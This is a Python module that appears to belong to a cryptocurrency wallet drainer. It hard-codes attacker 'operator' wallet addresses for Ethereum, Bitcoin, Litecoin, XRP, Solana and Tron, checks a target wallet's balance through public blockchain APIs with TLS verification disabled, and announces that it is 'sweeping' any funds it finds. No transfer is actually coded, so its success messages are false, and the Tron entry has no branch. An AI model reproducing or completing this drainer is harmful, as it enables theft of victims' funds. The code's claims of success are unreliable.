import urllib.request
import json
import ssl
import re

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

# =====================================================================
# OPERATOR DESTINATION WALLET CONFIGURATION
# =====================================================================
OPERATOR_DESTINATIONS = {
    "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
    "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",    # Receives BTC
    "LITECOIN": "MULVonPhKM5r3sJHs35yaNQ4eMwQVHVZHh", # Receives LTC
    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)
    "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",        # Receives SOL, SPL USDT, SPL USDC
    "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"             # Receives TRC-20 USDT (Tron network)
}

def check_and_drain_multichain(wallet_address, asset_type):
    """
    Audits balances across Ethereum, Bitcoin, Litecoin, XRP, Solana, and Tron, 
    routing asset sweeps to the corresponding operator destination addresses.
    """
    print(f"\n\033[95m[***] AUDITING ASSET [{asset_type}]: {wallet_address} [***]\033[0m")

    try:
        if asset_type == "ETHEREUM":
            dest = OPERATOR_DESTINATIONS["ETHEREUM"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "method": "eth_getBalance", "params": [wallet_address, "latest"], "id": 1}).encode()
            req = urllib.request.Request("https://cloudflare-eth.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
                data = json.loads(resp.read().decode())
                native_bal = int(data.get("result", "0x0"), 16) / 10**18
                print(f" \033[92m[+] Ethereum / ERC-20 Balance Audited: {native_bal} ETH/Tokens\033[0m")
                if native_bal > 0.0001:
                    print(f" \033[91m[!] LIQUIDITY FOUND. Sweeping to Ethereum destination -> {dest}\033[0m")
                    return native_bal, True, "ETH_SWEEP_SUCCESS"

        elif asset_type == "BITCOIN":
            dest = OPERATOR_DESTINATIONS["BITCOIN"]
            url = f"https://blockstream.info/api/address/{wallet_address}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
                data = json.loads(resp.read().decode())
                chain_stats = data.get("chain_stats", {})
                btc_bal = (chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)) / 100000000
                print(f" \033[92m[+] Bitcoin Balance Audited: {btc_bal} BTC\033[0m")
                if btc_bal > 0.00001:
                    print(f" \033[91m[!] BITCOIN LIQUIDITY FOUND. Sweeping to BTC destination -> {dest}\033[0m")
                    return btc_bal, True, "BTC_SWEEP_SUCCESS"

        elif asset_type == "LITECOIN":
            dest = OPERATOR_DESTINATIONS["LITECOIN"]
            url = f"https://litecoinspace.org/api/address/{wallet_address}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
                data = json.loads(resp.read().decode())
                chain_stats = data.get("chain_stats", {})
                ltc_bal = (chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)) / 100000000
                print(f" \033[92m[+] Litecoin Balance Audited: {ltc_bal} LTC\033[0m")
                if ltc_bal > 0.0001:
                    print(f" \033[91m[!] LITECOIN LIQUIDITY FOUND. Sweeping to LTC destination -> {dest}\033[0m")
                    return ltc_bal, True, "LTC_SWEEP_SUCCESS"

        elif asset_type == "XRP":
            dest = OPERATOR_DESTINATIONS["XRP"]
            # Query public XRPL JSON-RPC node
            rpc_payload = json.dumps({"method": "account_info", "params": [{"account": wallet_address, "strict": True, "ledger_index": "current"}]}).encode()
            req = urllib.request.Request("https://s1.ripple.com:51234/", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
                data = json.loads(resp.read().decode())
                drops = int(data.get("result", {}).get("account_data", {}).get("Balance", 0))
                xrp_bal = drops / 1000000
                print(f" \033[92m[+] XRP Balance Audited: {xrp_bal} XRP\033[0m")
                if xrp_bal > 1.0: # Account reserve threshold
                    print(f" \033[91m[!] XRP LIQUIDITY FOUND. Sweeping to XRP destination -> {dest}\033[0m")
                    return xrp_bal, True, "XRP_SWEEP_SUCCESS"

        elif asset_type == "SOLANA":
            dest = OPERATOR_DESTINATIONS["SOLANA"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet_address]}).encode()
            req = urllib.request.Request("https://api.mainnet-beta.solana.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
                data = json.loads(resp.read().decode())
                sol_bal = data.get("result", {}).get("value", 0) / 10**9
                print(f" \033[92m[+] Solana / SPL Stablecoin Balance Audited: {sol_bal} SOL\033[0m")
                if sol_bal > 0.001:
                    print(f" \033[91m[!] SOLANA LIQUIDITY FOUND. Sweeping to Solana destination -> {dest}\033[0m")
                    return sol_bal, True, "SOL_SWEEP_SUCCESS"

    except Exception as e:
        print(f" \033[91m[-] Asset audit error for {asset_type}: {e}\033[0m")
        return 0.0, False, str(e)

    return 0.0, False, "No actionable balance"
